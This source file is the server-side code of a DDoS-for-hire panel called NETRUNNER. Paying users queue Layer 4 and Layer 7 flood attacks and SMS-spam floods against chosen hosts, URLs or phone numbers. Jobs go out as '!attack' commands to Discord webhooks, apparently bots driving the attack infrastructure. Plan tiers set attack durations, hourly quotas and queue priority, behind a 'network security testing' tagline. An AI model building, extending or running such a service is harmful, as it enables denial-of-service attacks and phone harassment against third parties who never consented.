
'use server';

import { z } from 'zod';
import { ALLOWED_METHODS, ALLOWED_WEB_METHODS, ALLOWED_SMS_METHODS, BLACKLISTED_HOSTS } from '@/config/attacks';
import type { AttackInput, ClientAttackJob, AttackHistoryJob, User, Plan, SiteSettings } from '@/lib/types';
import { headers, cookies } from 'next/headers';
import { db } from '@/lib/firebase';
import { collection, getDocs, doc, writeBatch, setDoc, query, orderBy, limit, getDoc, updateDoc, deleteDoc, addDoc, where } from 'firebase/firestore';
import { getUserFromSession } from '@/lib/auth';

// ================================================================= //
// Helper function to handle reading collections
// ================================================================= //
async function getCollection<T>(collectionName: string): Promise<T[]> {
  try {
    const collectionRef = collection(db, collectionName);
    const snapshot = await getDocs(collectionRef);
    if (snapshot.empty) return [];
    // Manually add the document ID to the object
    return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as T & { id: string }));
  } catch (error) {
    console.error(`[Firestore Client Error] Failed to read collection '${collectionName}':`, error);
    return [];
  }
}

async function getCollectionWithQuery<T>(q: any): Promise<T[]> {
  try {
    const snapshot = await getDocs(q);
    if (snapshot.empty) return [];
     // Manually add the document ID to the object
    return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as T & { id: string }));
  } catch (error) {
    console.error(`[Firestore Client Error] Failed to query collection:`, error);
    return [];
  }
}

// ================================================================= //
// DB functions that were in db.ts are now here
// ================================================================= //

async function readUsers(): Promise<User[]> {
  const snapshot = await getDocs(collection(db, 'users'));
  return snapshot.docs.map(doc => ({id: doc.id, ...doc.data()} as User & {id: string}));
}

async function readUser(userId: string): Promise<User | null> {
    try {
        const userDocRef = doc(db, 'users', userId);
        const userDoc = await getDoc(userDocRef);
        return userDoc.exists() ? ({id: userDoc.id, ...userDoc.data()} as User & {id: string}) : null;
    } catch (error) {
        console.error(`[Firestore Client Error] Failed to read user '${userId}':`, error);
        return null;
    }
}

async function readSiteSettings(): Promise<SiteSettings> {
  const defaultSettings: SiteSettings = {
    appName: 'NETRUNNER',
    logoUrl: '',
    webhookUrl: '',
    webhookUrlL4: '',
    webhookUrlL7: '',
    webhookUrlSms: '',
    backgroundImageUrl: '',
    backgroundOpacity: 0.4,
    successMessage: 'Attack command successfully sent to Discord bot.',
    discordServerId: '',
    recipientPhone: '',
    paidPlanPrice: 50,
    plusPlanPrice: 150,
    promptPayId: '',
    landingTagline: 'แพลตฟอร์มทดสอบความปลอดภัยเครือข่ายยุคใหม่ที่ขับเคลื่อนด้วย AI',
    landingSubTagline: 'ควบคุม, สั่งการ, และวิเคราะห์ ทั้งหมดในที่เดียว',
    isApiEnabled: false,
    maintenanceMode: false,
  };
  try {
    const docRef = doc(db, 'settings', 'site');
    const docSnapshot = await getDoc(docRef);
    return docSnapshot.exists() ? { ...defaultSettings, ...docSnapshot.data() } : defaultSettings;
  } catch (error) {
     console.error(`[Firestore Client Error] Failed to read site settings, returning default:`, error);
     return defaultSettings;
  }
}

async function readQueue(): Promise<ClientAttackJob[]> {
  const q = query(collection(db, 'queue'), orderBy('timestamp', 'asc'));
  return getCollectionWithQuery<ClientAttackJob>(q);
}

async function writeAttackHistory(entry: AttackHistoryJob): Promise<void> {
  try {
    // Add a new document to the history collection
    await addDoc(collection(db, 'attack_history'), entry);
    // Note: A maintenance script might be needed to trim the history collection if it grows too large.
  } catch (error) {
    console.error(`[Firestore Client Error] Failed to write attack history:`, error);
  }
}

async function readPlans(): Promise<Plan[]> {
  const snapshot = await getDocs(collection(db, 'plans'));
  if (snapshot.empty) {
    return [
      { id: "free", name: "Free", price: 0, maxAttackTimeL4: 30, maxAttackTimeL7: 30, attacksPerHour: 10, apiRequestsPerHour: 0, defaultDurationDays: 9999, canCreateApiKeys: false },
      { id: "paid", name: "Paid", price: 50, salePrice: 39, maxAttackTimeL4: 300, maxAttackTimeL7: 120, attacksPerHour: 50, apiRequestsPerHour: 100, defaultDurationDays: 30, canCreateApiKeys: true },
      { id: "plus", name: "Plus", price: 150, maxAttackTimeL4: 300, maxAttackTimeL7: 300, attacksPerHour: 999, apiRequestsPerHour: 500, defaultDurationDays: 30, canCreateApiKeys: true }
    ];
  }
  return snapshot.docs.map(p => ({ ...p.data(), id: p.id, price: Number(p.data().price) || 0, salePrice: p.data().salePrice !== undefined ? Number(p.data().salePrice) : undefined } as Plan & {id: string}));
}


// ================================================================= //
// Action logic starts here
// ================================================================= //

const attackSchema = z.object({
  host: z.string().min(1, { message: "Host cannot be empty." }),
  port: z.coerce.number().min(1).max(65535),
  time: z.coerce.number().min(1),
  method: z.enum(ALLOWED_METHODS as [string, ...string[]]),
});

const webAttackSchema = z.object({
  url: z.string().url({ message: "Please enter a valid URL." }),
  time: z.coerce.number().min(1),
  method: z.enum(ALLOWED_WEB_METHODS as [string, ...string[]]),
});

const smsSpamSchema = z.object({
  phoneNumber: z.string().min(9, { message: "Please enter a valid phone number." }),
  time: z.coerce.number().min(1),
  method: z.enum(ALLOWED_SMS_METHODS as [string, ...string[]]),
});


function getClientIp(): string {
    const headersList = headers();
    const forwardedFor = headersList.get('x-forwarded-for');
    if (forwardedFor) return forwardedFor.split(',')[0].trim();
    const realIp = headersList.get('x-real-ip');
    if (realIp) return realIp.trim();
    return '127.0.0.1';
}

function isBlacklisted(target: string): boolean {
    const lowercasedTarget = target.toLowerCase();
    return BLACKLISTED_HOSTS.some(blacklistedHost => lowercasedTarget.includes(blacklistedHost));
}

async function sendDiscordCommand(content: string, method: string): Promise<{success: boolean, message?: string, error?: string}> {
    const settings = await readSiteSettings();
    
    let webhookUrl: string | undefined;
    if (ALLOWED_METHODS.includes(method)) webhookUrl = settings.webhookUrlL4 || settings.webhookUrl;
    else if (ALLOWED_WEB_METHODS.includes(method)) webhookUrl = settings.webhookUrlL7 || settings.webhookUrl;
    else if (ALLOWED_SMS_METHODS.includes(method)) webhookUrl = settings.webhookUrlSms || settings.webhookUrl;
    else webhookUrl = settings.webhookUrl;

    if (!webhookUrl) return { success: false, error: `ระบบนี้ยังไม่เปิดให้บริการ` };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content }),
        });
        if (!response.ok) {
            console.error(`Discord webhook error: ${response.status} ${await response.text()}`);
            return { success: false, error: `Failed to send command to Discord. Status: ${response.status}.` };
        }
        return { success: true, message: settings.successMessage || "Attack command successfully sent." };
    } catch (error: any) {
        console.error("Error sending to Discord webhook:", error);
        return { success: false, error: error.message || "Could not connect to the Discord webhook service." };
    }
}

async function processQueue(): Promise<void> {
    const allQueueJobs = await readQueue();
    const now = Date.now();
    let hasChanges = false;
    let batch = writeBatch(db);

    const finishedAttacks = allQueueJobs.filter(job => 
        job.status === 'active' && 
        new Date(job.timestamp!).getTime() + (job.time * 1000) < now
    );

    if (finishedAttacks.length > 0) {
        finishedAttacks.forEach(job => batch.delete(doc(db, 'queue', job.id)));
        await batch.commit();
        // After committing, we need to read the queue again to get the fresh state
        // or just filter the in-memory list. Let's filter in-memory for performance.
        const remainingQueue = allQueueJobs.filter(job => !finishedAttacks.some(f => f.id === job.id));
        processNextInQueue(remainingQueue); // Pass the remaining queue to the next processor
        return;
    }

    // If no attacks were finished and removed, process the next in queue directly.
    processNextInQueue(allQueueJobs);
}

async function processNextInQueue(queue: ClientAttackJob[]): Promise<void> {
    const isSystemBusy = queue.some(job => job.status === 'active');
    if (isSystemBusy) {
        return;
    }

    const queuedJobs = queue.filter(j => j.status === 'queued');
    if (queuedJobs.length === 0) {
        return;
    }
    
    // Sorting by plan price needs user and plan data
    const allUsers = await readUsers();
    const allPlans = await readPlans();
    const userMap = new Map(allUsers.map(u => [u.id, u]));
    const planMap = new Map(allPlans.map(p => [p.id, p]));

    queuedJobs.sort((a, b) => {
        const userA = userMap.get(a.userId);
        const userB = userMap.get(b.userId);
        if (!userA || !userB) return 0;
        const planA = planMap.get(userA.plan);
        const planB = planMap.get(userB.plan);
        return (planB?.price ?? 0) - (planA?.price ?? 0);
    });

    const jobToRun = queuedJobs[0];
    
    const isL7OrSms = ALLOWED_WEB_METHODS.includes(jobToRun.method) || ALLOWED_SMS_METHODS.includes(jobToRun.method);
    const commandPort = isL7OrSms ? 80 : jobToRun.port;
    const content = `!attack ${jobToRun.host} ${commandPort} ${jobToRun.time} ${jobToRun.method.toUpperCase()}`;
    
    const discordResult = await sendDiscordCommand(content, jobToRun.method);

    if (!discordResult.success) {
        console.error(`Failed to launch attack for user ${jobToRun.userId}: ${discordResult.error}`);
        // Remove the failed job from the queue and try processing the next one
        await deleteDoc(doc(db, 'queue', jobToRun.id));
        await processQueue();
        return;
    }

    // Update job to active
    const launchedTimestamp = new Date().toISOString();
    const jobRef = doc(db, 'queue', jobToRun.id);
    const launchedJobData = {
        status: 'active' as const,
        timestamp: launchedTimestamp,
        statusMessage: discordResult.message,
        ip: getClientIp(),
        userAgent: headers().get('user-agent') || 'Unknown'
    };
    
    await updateDoc(jobRef, launchedJobData);
    
    // Add to history
    const { id, ...historyData } = { ...jobToRun, ...launchedJobData };
    await writeAttackHistory(historyData);
}

export async function getQueue(): Promise<ClientAttackJob[]> {
    await processQueue(); 
    return await readQueue();
}

export async function addAttacksToQueue(attacks: AttackInput[], userOverride?: User): Promise<{success: boolean, error?: string, message?: string}> {
    const user = userOverride || await getUserFromSession();
    if (!user) {
        return { success: false, error: 'Authentication required.' };
    }
    
    if (user.role !== 'admin' && user.role !== 'moderator') {
        const historySnapshot = await getDocs(query(collection(db, 'attack_history'), where('userId', '==', user.id), where('timestamp', '>', new Date(Date.now() - 3600000).toISOString())));
        if (historySnapshot.docs.length >= user.planAttacksPerHour) {
            return { success: false, error: `คุณได้ใช้การโจมตีครบโควต้า ${user.planAttacksPerHour} ครั้งต่อชั่วโมงแล้ว` };
        }
    }

    try {
        const batch = writeBatch(db);
        for (const attackData of attacks) {
             if (isBlacklisted(attackData.host)) {
                return { success: false, error: `เป้าหมาย ${attackData.host} อยู่ในบัญชีดำและไม่สามารถโจมตีได้` };
            }
            const isL4Method = ALLOWED_METHODS.includes(attackData.method);
            const result = isL4Method ? attackSchema.safeParse(attackData) : webAttackSchema.safeParse({url: attackData.host, time: attackData.time, method: attackData.method});

            if (!result.success) return { success: false, error: Object.values(result.error.flatten().fieldErrors)[0]?.[0] || "Invalid input." };
            if (isL4Method && result.data.time > user.maxAttackTimeL4) return { success: false, error: `Your maximum L4 attack time is ${user.maxAttackTimeL4}s.` };
            if (!isL4Method && (result.data as any).time > user.maxAttackTimeL7) return { success: false, error: `Your maximum L7 attack time is ${user.maxAttackTimeL7}s.` };
            
            
            const newJob: Omit<ClientAttackJob, 'id'> = {
                host: 'url' in result.data ? result.data.url : result.data.host,
                port: 'port' in result.data ? result.data.port : 80,
                time: result.data.time,
                method: result.data.method,
                userId: user.id,
                status: 'queued',
                timestamp: new Date().toISOString(), // Use as queueing time initially
            };
            const docRef = doc(collection(db, 'queue')); // Auto-generate ID
            batch.set(docRef, newJob);
        }
        
        await batch.commit();
        await processQueue();
        
        return { success: true, message: "เพิ่มคำสั่งเข้าคิวเรียบร้อยแล้ว" };

    } catch(e) {
        console.error("Failed to add jobs to queue:", e);
        return { success: false, error: "Failed to add jobs to the queue." };
    }
}

export async function sendWebAttack(formData: FormData): Promise<{success: boolean, error?: string, message?: string}> {
    const user = await getUserFromSession();
    if (!user) return { success: false, error: 'Authentication required.' };
    const result = webAttackSchema.safeParse(Object.fromEntries(formData.entries()));
    if (!result.success) return { success: false, error: Object.values(result.error.flatten().fieldErrors)[0]?.[0] || "Invalid input." };
    const { url, time, method } = result.data;
    if (isBlacklisted(url)) return { success: false, error: `เป้าหมาย ${url} อยู่ในบัญชีดำและไม่สามารถโจมตีได้` };
    if (time > user.maxAttackTimeL7) return { success: false, error: `Your maximum L7 attack time is ${user.maxAttackTimeL7}s.` };
    
    return await addAttacksToQueue([{ host: url, port: 80, time, method }], user);
}

export async function sendSmsSpam(formData: FormData): Promise<{success: boolean, error?: string, message?: string}> {
    const user = await getUserFromSession();
    if (!user) return { success: false, error: 'Authentication required.' };
    const result = smsSpamSchema.safeParse(Object.fromEntries(formData.entries()));
    if (!result.success) return { success: false, error: Object.values(result.error.flatten().fieldErrors)[0]?.[0] || "Invalid input." };
    const { phoneNumber, time, method } = result.data;
    // SMS Spam time limit should be tied to L4, as it's not a web attack
    if (time > user.maxAttackTimeL4) return { success: false, error: `Your maximum attack time is ${user.maxAttackTimeL4}s.` };
    
    return await addAttacksToQueue([{ host: phoneNumber, port: 80, time, method }], user);
}

export async function deleteQueueJob(jobId: string): Promise<{success: boolean, error?: string}> {
    const user = await getUserFromSession();
    if (!user) return { success: false, error: 'Authentication required.' };
    
    try {
        const jobDoc = await getDoc(doc(db, 'queue', jobId));
        if (!jobDoc.exists()) {
             return { success: false, error: 'Job not found in queue.' };
        }
        const jobToDelete = jobDoc.data() as ClientAttackJob;

        if (user.role !== 'admin' && user.role !== 'moderator' && jobToDelete.userId !== user.id) {
            return { success: false, error: 'Unauthorized.' };
        }
        
        await deleteDoc(doc(db, 'queue', jobId));
        await processQueue(); 
        return { success: true };
    } catch (e) {
        console.error("Failed to delete job from queue:", e);
        return { success: false, error: "Failed to delete job from the queue." };
    }
}

export async function stopActiveAttack(): Promise<{success: boolean, error?: string}> {
    const user = await getUserFromSession();
    if (user?.role !== 'admin') return { success: false, error: 'Unauthorized.' };
    try {
        const settings = await readSiteSettings();
        const webhooks = [...new Set([settings.webhookUrl, settings.webhookUrlL4, settings.webhookUrlL7, settings.webhookUrlSms].filter(Boolean))];
        for (const url of webhooks) {
             try {
                await fetch(url as string, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '!stop' }) });
            } catch(e) {
                console.error(`Failed to send stop command to ${url}`, e);
            }
        }
        // Clear the entire queue by deleting all documents
        const queueSnapshot = await getDocs(collection(db, 'queue'));
        const batch = writeBatch(db);
        queueSnapshot.docs.forEach(d => batch.delete(d.ref));
        await batch.commit();

        return { success: true };
    } catch (e: any) {
        console.error("Failed to stop attack and clear queue:", e);
        return { success: false, error: e.message || "Failed to stop the active attack and clear the queue." };
    }
}
